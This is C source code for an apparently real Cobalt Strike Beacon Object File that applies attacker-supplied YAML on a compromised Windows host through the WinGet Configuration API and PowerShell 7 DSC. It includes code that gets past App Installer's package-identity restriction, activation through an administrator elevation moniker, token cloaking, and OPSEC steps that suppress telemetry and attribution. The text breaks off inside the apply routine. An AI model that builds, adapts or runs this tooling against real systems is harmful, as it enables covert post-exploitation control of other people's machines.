/*
 * dscourier.c - WinGet Configuration BOF for Cobalt Strike 4.9+ (tested 4.12)
 *
 * Hang-resistant rewrite. Key changes vs. original:
 *
 *   1. dscourier-check no longer touches DCOM. It checks the registry for
 *      the ConfigurationStaticFunctions CLSID under both Packaged COM
 *      (HKLM\SOFTWARE\Classes\PackagedCom\ClassIndex\{GUID} - where modern
 *      App Installer AppX registers it) and the classic CLSID tree. This is
 *      fast, never hangs, and OPSEC-friendly (no WindowsPackageManagerServer
 *      spawn for a probe).
 *
 *   2. dscourier-apply guards CoCreateInstance with CoEnableCallCancellation
 *      plus a watchdog thread that calls CoCancelCall after DS_ACTIVATE_TIMEOUT_MS.
 *      On systems where WindowsPackageManagerServer.exe fails to start (stripped
 *      Win10 Enterprise G / LTSC, App Installer yanked, Store offline...),
 *      activation now returns RPC_E_CALL_CANCELED instead of blocking forever.
 *
 *   3. Factory-async timeout raised to 60s to match the README and pwsh cold-start
 *      reality; store-async stays at 10s (it's an in-memory stream flush).
 *
 *   4. Apply also does the registry pre-check, so an unregistered CLSID fails fast
 *      with REGDB_E_CLASSNOTREG instead of blocking on DCOM activation.
 *
 *   5. RPC_E_CHANGED_MODE from CoInitializeEx is treated as success (we accept
 *      whatever apartment the thread already has, rather than bailing).
 *
 * Same packed arg layout as before (dscourier.cna, bof_pack "iib"):
 *   int32  mode   : 0 = apply, 1 = check
 *   int32  flags  : bit0=elevated  bit1=verbose
 *   bin    yaml   : UTF-8 YAML bytes (ignored in check mode)
 */

#include <windows.h>
#include <objbase.h>

#include "beacon.h"
#include "dscourier.h"

/* ========================================================================= *
 *  Constants
 * ========================================================================= */
#define DS_CLSCTX_LOCAL_SERVER           0x00000004
#define DS_COINIT_MULTITHREADED          0x00000000
#define DS_RO_INIT_MULTITHREADED         0x00000001

#define DS_RPC_C_AUTHN_DEFAULT           0xFFFFFFFF
#define DS_RPC_C_AUTHZ_DEFAULT           0xFFFFFFFF
#define DS_RPC_C_AUTHN_LEVEL_CALL        0x3
#define DS_RPC_C_IMP_LEVEL_IMPERSONATE   0x3
#define DS_EOAC_DYNAMIC_CLOAKING         0x40

#define DS_ACTIVATE_TIMEOUT_MS           30000
#define DS_ASYNC_TIMEOUT_FACTORY_MS      60000
#define DS_ASYNC_TIMEOUT_STORE_MS        10000
#define DS_ASYNC_POLL_MS                 100

#define DS_FLAG_ELEVATED                 0x1
#define DS_FLAG_VERBOSE                  0x2

#define HR_RPC_E_CHANGED_MODE            ((HRESULT)0x80010106L)
#define HR_RPC_E_CALL_CANCELED           ((HRESULT)0x80010002L)
#define HR_REGDB_E_CLASSNOTREG           ((HRESULT)0x80040154L)
/* App Installer 1.19+ rejects CoCreateInstance from non-packaged callers.
 * Fall back to RoGetActivationFactory (WinRT path) which has no such
 * restriction and is designed for Win32 / non-packaged consumers. */
#define HR_APPMODEL_NO_PACKAGE           ((HRESULT)0x80073D54L)

/* ========================================================================= *
 *  DFR imports
 * ========================================================================= */
DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoInitializeEx(LPVOID, DWORD);
DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoCreateInstance(REFCLSID, LPUNKNOWN, DWORD, REFIID, LPVOID*);
DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoGetObject(LPCWSTR, void*, REFIID, void**);
DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoSetProxyBlanket(IUnknown*, DWORD, DWORD, OLECHAR*, DWORD, DWORD, void*, DWORD);
DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoEnableCallCancellation(void*);
DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoDisableCallCancellation(void*);
DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoCancelCall(DWORD, ULONG);
DECLSPEC_IMPORT void    WINAPI OLE32$CoUninitialize(void);

DECLSPEC_IMPORT HRESULT WINAPI COMBASE$RoInitialize(DWORD);
DECLSPEC_IMPORT void    WINAPI COMBASE$RoUninitialize(void);
DECLSPEC_IMPORT HRESULT WINAPI COMBASE$WindowsCreateString(const WCHAR*, UINT32, HSTRING*);
DECLSPEC_IMPORT HRESULT WINAPI COMBASE$WindowsDeleteString(HSTRING);
DECLSPEC_IMPORT const WCHAR * WINAPI COMBASE$WindowsGetStringRawBuffer(HSTRING, UINT32*);
DECLSPEC_IMPORT HRESULT WINAPI COMBASE$RoGetActivationFactory(HSTRING, REFIID, void**);
DECLSPEC_IMPORT HRESULT WINAPI COMBASE$RoActivateInstance(HSTRING, IInspectable**);

DECLSPEC_IMPORT void    WINAPI KERNEL32$Sleep(DWORD);
DECLSPEC_IMPORT int     WINAPI KERNEL32$MultiByteToWideChar(UINT, DWORD, LPCCH, int, LPWSTR, int);
DECLSPEC_IMPORT int     WINAPI KERNEL32$WideCharToMultiByte(UINT, DWORD, LPCWCH, int, LPSTR, int, LPCCH, LPBOOL);
DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$CreateThread(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
DECLSPEC_IMPORT DWORD   WINAPI KERNEL32$GetCurrentThreadId(void);
DECLSPEC_IMPORT DWORD   WINAPI KERNEL32$WaitForSingleObject(HANDLE, DWORD);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$CloseHandle(HANDLE);

DECLSPEC_IMPORT LONG    WINAPI ADVAPI32$RegOpenKeyExW(HKEY, LPCWSTR, DWORD, REGSAM, PHKEY);
DECLSPEC_IMPORT LONG    WINAPI ADVAPI32$RegQueryValueExW(HKEY, LPCWSTR, LPDWORD, LPDWORD, LPBYTE, LPDWORD);
DECLSPEC_IMPORT LONG    WINAPI ADVAPI32$RegCloseKey(HKEY);

/* NtOpenKey: bypasses WOW64 registry redirection entirely.
 * Used as a final fallback in probe_registry so an x86 BOF running on
 * x64 Windows can still reach the 64-bit PackagedCom ClassIndex hive. */
DECLSPEC_IMPORT LONG    NTAPI  NTDLL$NtOpenKey(PHANDLE, ACCESS_MASK, PVOID);
DECLSPEC_IMPORT void    NTAPI  NTDLL$RtlInitUnicodeString(PVOID, PCWSTR);
DECLSPEC_IMPORT LONG    NTAPI  NTDLL$NtClose(HANDLE);

DECLSPEC_IMPORT int     WINAPIV USER32$wvsprintfA(LPSTR, LPCSTR, va_list);

/* ========================================================================= *
 *  Output helpers
 * ========================================================================= */
static BOOL g_verbose = FALSE;

#define IINSP(x)   ((IInspectable*)(x))
#define SAFE_REL(x) do { if (x) { IINSP(x)->lpVtbl->Release(IINSP(x)); (x) = NULL; } } while (0)

static void vout(int ch, const char *fmt, va_list ap) {
    char buf[1024];
    USER32$wvsprintfA(buf, fmt, ap);
    BeaconPrintf(ch, "%s", buf);
}
static void vinfo(const char *fmt, ...) {
    if (!g_verbose) return;
    va_list ap; va_start(ap, fmt);
    vout(CALLBACK_OUTPUT, fmt, ap);
    va_end(ap);
}
static void trace(const char *fmt, ...) {
    if (!g_verbose) return;
    va_list ap; va_start(ap, fmt);
    vout(CALLBACK_OUTPUT, fmt, ap);
    va_end(ap);
}
static void ok(const char *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    vout(CALLBACK_OUTPUT, fmt, ap);
    va_end(ap);
}
static void err(const char *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    vout(CALLBACK_ERROR, fmt, ap);
    va_end(ap);
}

/* ========================================================================= *
 *  HSTRING utilities
 * ========================================================================= */
static HRESULT hstring_from_wcstr(const WCHAR *s, HSTRING *out) {
    UINT32 len = 0;
    while (s[len]) len++;
    return COMBASE$WindowsCreateString(s, len, out);
}

static int hstring_to_utf8(HSTRING h, char *buf, int buflen) {
    if (!h || buflen <= 0) { if (buflen) buf[0] = 0; return 0; }
    UINT32 wlen = 0;
    const WCHAR *wbuf = COMBASE$WindowsGetStringRawBuffer(h, &wlen);
    if (!wbuf || wlen == 0) { buf[0] = 0; return 0; }
    int n = KERNEL32$WideCharToMultiByte(CP_UTF8, 0, wbuf, (int)wlen, buf, buflen - 1, NULL, NULL);
    if (n < 0) n = 0;
    buf[n] = 0;
    return n;
}

/* ========================================================================= *
 *  Registry probe - does the ConfigurationStaticFunctions CLSID exist?
 *
 *  On modern Windows the WinGet Configuration class ships inside the
 *  Microsoft.DesktopAppInstaller AppX package and is registered via
 *  Packaged COM at HKLM\SOFTWARE\Classes\PackagedCom\ClassIndex\{GUID} -
 *  the classic HKCR\CLSID\{GUID} path is absent. We probe PackagedCom first
 *  and fall back to the classic CLSID locations for dev installs / older
 *  out-of-box builds. Only the key's existence is required; PackagedCom
 *  carries no LocalServer32 subkey, so server_path_out stays empty there.
 * ========================================================================= */
static HRESULT probe_registry(WCHAR *server_path_out, DWORD cch_out) {
    struct { HKEY root; const WCHAR *path; REGSAM extra; } tries[] = {
        /* Packaged COM (AppX App Installer on Win10/11). This is the only
         * path that resolves on a stock modern box. */
        { HKEY_LOCAL_MACHINE, L"SOFTWARE\\Classes\\PackagedCom\\ClassIndex\\{73D763B7-2937-432F-A97A-D98A4A596126}", KEY_WOW64_64KEY },
        { HKEY_LOCAL_MACHINE, L"SOFTWARE\\Classes\\PackagedCom\\ClassIndex\\{73D763B7-2937-432F-A97A-D98A4A596126}", 0 },
        /* Classic CLSID locations - dev installs of winget-cli, older OOB. */
        { HKEY_CLASSES_ROOT,  L"CLSID\\{73D763B7-2937-432F-A97A-D98A4A596126}",                        0 },
        { HKEY_CLASSES_ROOT,  L"CLSID\\{73D763B7-2937-432F-A97A-D98A4A596126}",                        KEY_WOW64_64KEY },
        { HKEY_CURRENT_USER,  L"Software\\Classes\\CLSID\\{73D763B7-2937-432F-A97A-D98A4A596126}",     0 },
        { HKEY_LOCAL_MACHINE, L"SOFTWARE\\Classes\\CLSID\\{73D763B7-2937-432F-A97A-D98A4A596126}",     0 },
        { HKEY_LOCAL_MACHINE, L"SOFTWARE\\Classes\\CLSID\\{73D763B7-2937-432F-A97A-D98A4A596126}",     KEY_WOW64_64KEY },
    };

    if (server_path_out && cch_out) server_path_out[0] = 0;

    for (unsigned i = 0; i < sizeof(tries)/sizeof(tries[0]); i++) {
        HKEY h = NULL;
        LONG rc = ADVAPI32$RegOpenKeyExW(tries[i].root, tries[i].path, 0,
                                         KEY_READ | tries[i].extra, &h);
        if (rc != ERROR_SUCCESS) { trace("[T] registry try %u: 0x%lX\n", i, rc); continue; }

        /* Optionally read LocalServer32 default for verbose reporting. */
        if (server_path_out && cch_out) {
            HKEY hls = NULL;
            LONG lrc = ADVAPI32$RegOpenKeyExW(h, L"LocalServer32", 0,
                                              KEY_READ | tries[i].extra, &hls);
            if (lrc == ERROR_SUCCESS) {
                DWORD type = 0, cb = cch_out * sizeof(WCHAR);
                LONG qr = ADVAPI32$RegQueryValueExW(hls, NULL, NULL, &type,
                                                    (LPBYTE)server_path_out, &cb);
                if (qr == ERROR_SUCCESS && (type == REG_SZ || type == REG_EXPAND_SZ)) {
                    DWORD cch = cb / sizeof(WCHAR);
                    if (cch >= cch_out) cch = cch_out - 1;
                    server_path_out[cch] = 0;
                } else {
                    server_path_out[0] = 0;
                }
                ADVAPI32$RegCloseKey(hls);
            }
        }
        ADVAPI32$RegCloseKey(h);
        trace("[T] registry: matched at try %u\n", i);
        return S_OK;
    }

    /* NtOpenKey fallback: uses the kernel object namespace path, which is
     * completely immune to WOW64 registry redirection.  An x86 BOF running
     * inside a WOW64 process can reach the 64-bit hive this way even when
     * RegOpenKeyExW + KEY_WOW64_64KEY is misbehaving in a hardened sandbox. */
    {
        /* Inline UNICODE_STRING / OBJECT_ATTRIBUTES to avoid winternl.h dep. */
        struct { USHORT Len; USHORT MaxLen; PWSTR Buf; } ustr;
        struct {
            ULONG  Length;
            HANDLE RootDirectory;
            PVOID  ObjectName;
            ULONG  Attributes;
            PVOID  SecurityDescriptor;
            PVOID  SecurityQualityOfService;
        } oa;
        static const WCHAR nt_path[] =
            L"\\Registry\\Machine\\SOFTWARE\\Classes\\PackagedCom\\"
            L"ClassIndex\\{73D763B7-2937-432F-A97A-D98A4A596126}";

        NTDLL$RtlInitUnicodeString(&ustr, nt_path);

        oa.Length                   = sizeof(oa);
        oa.RootDirectory            = NULL;
        oa.ObjectName               = &ustr;
        oa.Attributes               = 0x40; /* OBJ_CASE_INSENSITIVE */
        oa.SecurityDescriptor       = NULL;
        oa.SecurityQualityOfService = NULL;

        HANDLE hk = NULL;
        LONG st = NTDLL$NtOpenKey(&hk, 0x20019 /* KEY_READ */, &oa);
        if (st == 0) {
            NTDLL$NtClose(hk);
            trace("[T] registry: matched via NtOpenKey (WOW64 bypass)\n");
            /* server_path_out stays empty — NtOpenKey path skips LocalServer32 */
            return S_OK;
        }
        trace("[T] NtOpenKey: 0x%lX\n", st);
    }

    return HR_REGDB_E_CLASSNOTREG;
}

/* ========================================================================= *
 *  Async: poll IAsyncOperation<T> to completion via IAsyncInfo.
 * ========================================================================= */
static HRESULT async_wait(IAsyncOperation *op, DWORD timeout_ms) {
    IAsyncInfo *info = NULL;
    HRESULT hr = op->lpVtbl->QueryInterface(op, &IID_IAsyncInfo_, (void**)&info);
    if (FAILED(hr)) return hr;

    AsyncStatus status = AsyncStatus_Started;
    DWORD waited = 0;
    for (;;) {
        hr = info->lpVtbl->get_Status(info, &status);
        if (FAILED(hr) || status != AsyncStatus_Started) break;
        if (timeout_ms && waited >= timeout_ms) { hr = HRESULT_FROM_WIN32(ERROR_TIMEOUT); break; }
        if ((waited % 5000) == 0 && waited > 0)
            trace("[T] async_wait: still polling (+%ums)\n", waited);
        KERNEL32$Sleep(DS_ASYNC_POLL_MS);
        waited += DS_ASYNC_POLL_MS;
    }

    if (SUCCEEDED(hr)) {
        if (status == AsyncStatus_Error) {
            HRESULT e = S_OK;
            info->lpVtbl->get_ErrorCode(info, &e);
            hr = e ? e : E_FAIL;
        } else if (status == AsyncStatus_Canceled) {
            hr = HRESULT_FROM_WIN32(ERROR_CANCELLED);
        }
    }
    info->lpVtbl->Release(info);
    return hr;
}

/* ========================================================================= *
 *  CoSetProxyBlanket: match winget-cli so the remote honours our token.
 * ========================================================================= */
static void set_cloaking(void *proxy) {
    OLE32$CoSetProxyBlanket(
        (IUnknown*)proxy,
        DS_RPC_C_AUTHN_DEFAULT,
        DS_RPC_C_AUTHZ_DEFAULT,
        NULL,
        DS_RPC_C_AUTHN_LEVEL_CALL,
        DS_RPC_C_IMP_LEVEL_IMPERSONATE,
        NULL,
        DS_EOAC_DYNAMIC_CLOAKING);
}

/* ========================================================================= *
 *  Activation watchdog. Cancels the RPC call on the target thread after
 *  DS_ACTIVATE_TIMEOUT_MS so CoCreateInstance / CoGetObject cannot hang
 *  forever when the DCOM server fails to start.
 * ========================================================================= */
typedef struct {
    DWORD   target_tid;
    HANDLE  stop_evt;   /* unused placeholder; we poll instead to keep deps small */
    DWORD   timeout_ms;
    BOOL    fired;
} ds_watchdog;

static DWORD WINAPI ds_watchdog_thread(LPVOID p) {
    ds_watchdog *w = (ds_watchdog*)p;
    DWORD slept = 0;
    while (slept < w->timeout_ms) {
        KERNEL32$Sleep(100);
        slept += 100;
        /* Target signals completion by setting timeout_ms to 0. */
        if (w->timeout_ms == 0) return 0;
    }
    w->fired = TRUE;
    trace("[T] watchdog: firing CoCancelCall on tid=%lu\n", w->target_tid);
    OLE32$CoCancelCall(w->target_tid, 0);
    return 0;
}

/* Guarded activation: CoCreateInstance / CoGetObject behind a CoCancelCall
 * watchdog. Returns RPC_E_CALL_CANCELED if the watchdog fired. */
static HRESULT activate_statics_guarded(BOOL elevated, IConfigurationStatics **out) {
    *out = NULL;

    /* Fast fail: no CLSID registration -> no point attempting DCOM. */
    HRESULT hr = probe_registry(NULL, 0);
    if (FAILED(hr)) {
        err("ConfigurationStaticFunctions CLSID not registered (REGDB_E_CLASSNOTREG)\n");
        err("WinGet / App Installer is not present or configuration support is disabled\n");
        return hr;
    }

    /* Arm CoCancelCall for this thread. */
    HRESULT hc = OLE32$CoEnableCallCancellation(NULL);
    BOOL armed = SUCCEEDED(hc);
    if (!armed) trace("[T] CoEnableCallCancellation failed 0x%08X (continuing unguarded)\n", hc);

    ds_watchdog w;
    w.target_tid = KERNEL32$GetCurrentThreadId();
    w.stop_evt   = NULL;
    w.timeout_ms = DS_ACTIVATE_TIMEOUT_MS;
    w.fired      = FALSE;

    HANDLE hwd = NULL;
    if (armed) {
        hwd = KERNEL32$CreateThread(NULL, 0, ds_watchdog_thread, &w, 0, NULL);
        if (!hwd) trace("[T] watchdog thread failed to start, continuing unguarded\n");
    }

    IConfigurationStatics *stat = NULL;
    if (elevated) {
        static const WCHAR moniker[] =
            L"Elevation:Administrator!new:{73D763B7-2937-432F-A97A-D98A4A596126}";
        trace("[T] activate: CoGetObject(elevation moniker)...\n");
        hr = OLE32$CoGetObject(moniker, NULL, &IID_IConfigurationStatics, (void**)&stat);
        trace("[T] activate: CoGetObject -> 0x%08X\n", hr);
    } else {
        trace("[T] activate: CoCreateInstance(LOCAL_SERVER)...\n");
        hr = OLE32$CoCreateInstance(&CLSID_ConfigurationStaticFunctions, NULL,
                                    DS_CLSCTX_LOCAL_SERVER,
                                    &IID_IConfigurationStatics, (void**)&stat);
        trace("[T] activate: CoCreateInstance -> 0x%08X\n", hr);

        /* App Installer 1.19+ blocks non-packaged callers via Packaged COM
         * (ERROR_APPMODEL_NO_PACKAGE).  WinRT factory activation uses a
         * separate code path that does not enforce package identity. */
        if (hr == HR_APPMODEL_NO_PACKAGE) {
            HSTRING hs_class = NULL;
            trace("[T] activate: CoCreateInstance -> NO_PACKAGE, retrying via RoGetActivationFactory\n");
            HRESULT hh = hstring_from_wcstr(
                L"Microsoft.Management.Configuration.ConfigurationStaticFunctions",
                &hs_class);
            if (SUCCEEDED(hh)) {
                hr = COMBASE$RoGetActivationFactory(hs_class, &IID_IConfigurationStatics,
                                                    (void**)&stat);
                trace("[T] activate: RoGetActivationFactory -> 0x%08X\n", hr);
                COMBASE$WindowsDeleteString(hs_class);
            }
        }
    }

    /* Tell watchdog to stand down. */
    w.timeout_ms = 0;
    if (hwd) {
        KERNEL32$WaitForSingleObject(hwd, 2000);
        KERNEL32$CloseHandle(hwd);
    }
    if (armed) OLE32$CoDisableCallCancellation(NULL);

    if (FAILED(hr)) {
        if (w.fired || hr == HR_RPC_E_CALL_CANCELED) {
            err("activation timed out after %ums (DCOM server not responding)\n",
                DS_ACTIVATE_TIMEOUT_MS);
            err("Likely: WindowsPackageManagerServer.exe can't start on this host\n");
            return HR_RPC_E_CALL_CANCELED;
        }
        err("activation failed: 0x%08X\n", hr);
        return hr;
    }

    set_cloaking(stat);
    *out = stat;
    return S_OK;
}

/* ========================================================================= *
 *  Build the processor chain. Only used by apply.
 * ========================================================================= */
typedef struct {
    IConfigurationStatics   *stat;
    IInspectable            *factory_insp;
    IInspectable            *proc_insp;
    IConfigurationProcessor *proc;
} ds_ctx;

static void ds_ctx_release(ds_ctx *c) {
    SAFE_REL(c->proc);
    SAFE_REL(c->proc_insp);
    SAFE_REL(c->factory_insp);
    if (c->stat) { c->stat->lpVtbl->Release(c->stat); c->stat = NULL; }
}

static HRESULT build_processor(ds_ctx *c, BOOL elevated) {
    IAsyncOperation *op = NULL;
    HSTRING hs_pwsh = NULL;
    HRESULT hr;

    c->stat = NULL; c->factory_insp = NULL; c->proc_insp = NULL; c->proc = NULL;

    hr = activate_statics_guarded(elevated, &c->stat);
    if (FAILED(hr)) goto done;
    vinfo("[*] ConfigurationStaticFunctions bound\n");

    hr = hstring_from_wcstr(L"pwsh", &hs_pwsh);
    if (FAILED(hr)) goto done;

    trace("[T] CreateConfigurationSetProcessorFactoryAsync(pwsh)...\n");
    hr = c->stat->lpVtbl->CreateConfigurationSetProcessorFactoryAsync(c->stat, hs_pwsh, &op);
    if (FAILED(hr)) { err("CreateFactoryAsync: 0x%08X\n", hr); goto done; }

    hr = async_wait(op, DS_ASYNC_TIMEOUT_FACTORY_MS);
    if (FAILED(hr)) {
        if (hr == HRESULT_FROM_WIN32(ERROR_TIMEOUT))
            err("pwsh factory timed out after %us (no PowerShell 7 installed?)\n",
                DS_ASYNC_TIMEOUT_FACTORY_MS / 1000);
        else
            err("factory wait: 0x%08X\n", hr);
        goto done;
    }

    hr = op->lpVtbl->GetResults(op, (void**)&c->factory_insp);
    if (FAILED(hr)) { err("GetResults: 0x%08X\n", hr); goto done; }
    vinfo("[*] pwsh factory ready\n");

    hr = c->stat->lpVtbl->CreateConfigurationProcessor(c->stat, c->factory_insp, &c->proc_insp);
    if (FAILED(hr)) { err("CreateProcessor: 0x%08X\n", hr); goto done; }

    hr = c->proc_insp->lpVtbl->QueryInterface(c->proc_insp,
                                              &IID_IConfigurationProcessor, (void**)&c->proc);
    if (FAILED(hr)) { err("QI IConfigurationProcessor: 0x%08X\n", hr); goto done; }

    /* OPSEC: skip put_Caller (no attribution string), telemetry off. */
    c->proc->lpVtbl->put_GenerateTelemetryEvents(c->proc, FALSE);

done:
    if (op) op->lpVtbl->Release(op);
    if (hs_pwsh) COMBASE$WindowsDeleteString(hs_pwsh);
    if (FAILED(hr)) ds_ctx_release(c);
    return hr;
}

/* ========================================================================= *
 *  YAML -> IInputStream
 * ========================================================================= */
static HRESULT yaml_to_input_stream(const char *yaml, int yaml_len,
                                    IInputStream **out_input,
                                    IInspectable **keepalive) {
    *out_input = NULL; *keepalive = NULL;

    IInspectable       *ras_insp = NULL;
    IRandomAccessStream *ras     = NULL;
    IOutputStream      *os       = NULL;
    IDataWriterFactory *dw_fact  = NULL;
    IDataWriter        *writer   = NULL;
    IAsyncOperation    *op       = NULL;
    HSTRING             hs_ras   = NULL;
    HSTRING             hs_dw    = NULL;
    HRESULT             hr;

    hr = hstring_from_wcstr(L"Windows.Storage.Streams.InMemoryRandomAccessStream", &hs_ras);
    if (FAILED(hr)) goto done;
    hr = COMBASE$RoActivateInstance(hs_ras, &ras_insp);
    if (FAILED(hr)) { err("activate IMRAS: 0x%08X\n", hr); goto done; }

    hr = ras_insp->lpVtbl->QueryInterface(ras_insp, &IID_IRandomAccessStream_, (void**)&ras);
    if (FAILED(hr)) goto done;

    hr = ras->lpVtbl->GetOutputStreamAt(ras, 0, &os);
    if (FAILED(hr)) goto done;

    hr = hstring_from_wcstr(L"Windows.Storage.Streams.DataWriter", &hs_dw);
    if (FAILED(hr)) goto done;
    hr = COMBASE$RoGetActivationFactory(hs_dw, &IID_IDataWriterFactory_, (void**)&dw_fact);
    if (FAILED(hr)) { err("DataWriter factory: 0x%08X\n", hr); goto done; }

    hr = dw_fact->lpVtbl->CreateDataWriter(dw_fact, os, &writer);
    if (FAILED(hr)) goto done;

    hr = writer->lpVtbl->WriteBytes(writer, (UINT32)yaml_len, (BYTE*)yaml);
    if (FAILED(hr)) goto done;

    hr = writer->lpVtbl->StoreAsync(writer, (void**)&op);
    if (FAILED(hr)) goto done;
    hr = async_wait(op, DS_ASYNC_TIMEOUT_STORE_MS);
    if (FAILED(hr)) { err("StoreAsync: 0x%08X\n", hr); goto done; }

    hr = ras->lpVtbl->GetInputStreamAt(ras, 0, out_input);
    if (FAILED(hr)) goto done;

    ras_insp->lpVtbl->AddRef(ras_insp);
    *keepalive = ras_insp;

done:
    if (op) op->lpVtbl->Release(op);
    SAFE_REL(writer);
    SAFE_REL(dw_fact);
    SAFE_REL(os);
    SAFE_REL(ras);
    SAFE_REL(ras_insp);
    if (hs_ras) COMBASE$WindowsDeleteString(hs_ras);
    if (hs_dw)  COMBASE$WindowsDeleteString(hs_dw);
    return hr;
}

/* ========================================================================= *
 *  OpenConfigurationSet
 * ========================================================================= */
static HRESULT open_set(IConfigurationProcessor *proc, IInputStream *input,
                        IInspectable **out_set) {
    IInspectable *open_insp = NULL;
    IOpenConfigurationSetResult *open_res = NULL;
    HRESULT hr;

    *out_set = NULL;

    hr = proc->lpVtbl->OpenConfigurationSet(proc, (IInspectable*)input, &open_insp);
    if (FAILED(hr)) { err("OpenConfigurationSet: 0x%08X\n", hr); return hr; }

    hr = open_insp->lpVtbl->QueryInterface(open_insp,
                                           &IID_IOpenConfigurationSetResult, (void**)&open_res);
    if (FAILED(hr)) goto done;

    hr = open_res->lpVtbl->get_Set(open_res, out_set);
    if (FAILED(hr) || !*out_set) {
        HRESULT rc = S_OK;
        open_res->lpVtbl->get_ResultCode(open_res, &rc);
        err("YAML parse failed: 0x%08X\n", rc);
        if (SUCCEEDED(hr)) hr = rc ? rc : E_FAIL;
    }

done:
    SAFE_REL(open_res);
    SAFE_REL(open_insp);
    return hr;
}

/* ========================================================================= *
 *  Iterate UnitResults.
 * ========================================================================= */
static HRESULT walk_unit_results(IApplyConfigurationSetResult *apply_result,
                                 int *out_ok, int *out_fail) {
    IInspectable *units_insp = NULL;
    IVectorView  *units      = NULL;
    HRESULT hr;
    UINT32 count = 0;
    int ok_n = 0, fail_n = 0;

    *out_ok = 0; *out_fail = 0;

    hr = apply_result->lpVtbl->get_UnitResults(apply_result, &units_insp);
    if (FAILED(hr) || !units_insp) { err("get_UnitResults: 0x%08X\n", hr); return hr; }

    hr = units_insp->lpVtbl->QueryInterface(units_insp,
                                            &IID_IVectorViewApplyUnitResult, (void**)&units);
    if (FAILED(hr)) { err("QI IVectorView: 0x%08X\n", hr); goto done; }

    units->lpVtbl->get_Size(units, &count);

    for (UINT32 i = 0; i < count; i++) {
        IInspectable *item = NULL;
        IApplyConfigurationUnitResult *ur = NULL;
        IInspectable *unit_insp = NULL, *info_insp = NULL;
        IConfigurationUnit *unit = NULL;
        IConfigurationUnitResultInformation *info = NULL;
        HSTRING hs_id = NULL, hs_desc = NULL;
        char id[128]  = {0};
        char desc[256] = {0};
        HRESULT rc = S_OK;

        if (FAILED(units->lpVtbl->GetAt(units, i, &item)) || !item) continue;
        if (FAILED(item->lpVtbl->QueryInterface(item, &IID_IApplyConfigurationUnitResult,
                                                (void**)&ur))) { SAFE_REL(item); continue; }

        if (SUCCEEDED(ur->lpVtbl->get_Unit(ur, &unit_insp)) && unit_insp) {
            if (SUCCEEDED(unit_insp->lpVtbl->QueryInterface(unit_insp, &IID_IConfigurationUnit,
                                                            (void**)&unit)) && unit) {
                unit->lpVtbl->get_Identifier(unit, &hs_id);
                hstring_to_utf8(hs_id, id, sizeof(id));
            }
        }
        if (SUCCEEDED(ur->lpVtbl->get_ResultInformation(ur, &info_insp)) && info_insp) {
            if (SUCCEEDED(info_insp->lpVtbl->QueryInterface(info_insp,
                             &IID_IConfigurationUnitResultInformation, (void**)&info)) && info) {
                info->lpVtbl->get_ResultCode(info, &rc);
                info->lpVtbl->get_Description(info, &hs_desc);
                hstring_to_utf8(hs_desc, desc, sizeof(desc));
            }
        }

        if (FAILED(rc) || rc != S_OK) {
            err("%s: 0x%08X %s\n", id[0] ? id : "(unit)", rc, desc);
            fail_n++;
        } else {
            vinfo("[+] %s\n", id[0] ? id : "(unit)");
            ok_n++;
        }

        if (hs_id)   COMBASE$WindowsDeleteString(hs_id);
        if (hs_desc) COMBASE$WindowsDeleteString(hs_desc);
        SAFE_REL(unit);
        SAFE_REL(unit_insp);
        SAFE_REL(info);
        SAFE_REL(info_insp);
        SAFE_REL(ur);
        SAFE_REL(item);
    }

    *out_ok = ok_n;
    *out_fail = fail_n;

done:
    SAFE_REL(units);
    SAFE_REL(units_insp);
    return hr;
}

/* ========================================================================= *
 *  Mode: check - registry-only probe, no DCOM activation.
 * ========================================================================= */
static int run_check(BOOL elevated) {
    WCHAR server_path[520] = {0};
    HRESULT hr = probe_registry(server_path, 520);
    if (SUCCEEDED(hr)) {
        ok("WinGet Configuration reachable%s\n", elevated ? " (elevated capable)" : "");
        if (g_verbose && server_path[0]) {
            char utf8[520] = {0};
            int n = KERNEL32$WideCharToMultiByte(CP_UTF8, 0, server_path, -1,
                                                 utf8, (int)sizeof(utf8) - 1, NULL, NULL);
            if (n > 0) vinfo("[*] LocalServer32: %s\n", utf8);
        }
        return 0;
    }

    /* Registry miss: fall back to a real CoCreateInstance (guarded by the
     * 30s watchdog + CoCancelCall), which is the only definitive signal.
     * This will transiently spawn WindowsPackageManagerServer.exe on success. */
    trace("[T] registry miss, falling back to guarded CoCreateInstance\n");

    IConfigurationStatics *stat = NULL;
    BOOL inited_com = FALSE, inited_ro = FALSE;
    HRESULT hc = OLE32$CoInitializeEx(NULL, DS_COINIT_MULTITHREADED);
    if (hc == S_OK || hc == S_FALSE) inited_com = TRUE;

    /* RoInitialize is required for the RoGetActivationFactory fallback inside
     * activate_statics_guarded (triggered when ERROR_APPMODEL_NO_PACKAGE). */
    hc = COMBASE$RoInitialize(DS_RO_INIT_MULTITHREADED);
    if (hc == S_OK || hc == S_FALSE) inited_ro = TRUE;

    hr = activate_statics_guarded(elevated, &stat);
    if (stat) { stat->lpVtbl->Release(stat); stat = NULL; }
    if (inited_ro)  COMBASE$RoUninitialize();
    if (inited_com) OLE32$CoUninitialize();

    if (SUCCEEDED(hr)) {
        ok("WinGet Configuration reachable via DCOM%s\n", elevated ? " (elevated)" : "");
        return 0;
    }
    err("WinGet Configuration NOT reachable (reg miss + activation 0x%08X)\n", hr);
    return 1;
}

/* ========================================================================= *
 *  Mode: apply
 * ========================================================================= */
static int run_apply(const char *yaml, int yaml_len, BOOL elevated) {
    ds_ctx c;
    IInputStream *input = NULL;
    IInspectable *keepalive = NULL;
    IInspectable *set = NULL;
    IInspectable *apply_insp = NULL;
    IApplyConfigurationSetResult *apply_result = NULL;
    int ok_n = 0, fail_n = 0;
    HRESULT hr;

    hr = build_processor(&c, elevated);
    if (FAILED(hr)) return 1;

    hr = yaml_to_input_stream(yaml, yaml_len, &input, &keepalive);
    if (FAILED(hr)) goto done;

    hr = open_set(c.proc, input, &set);
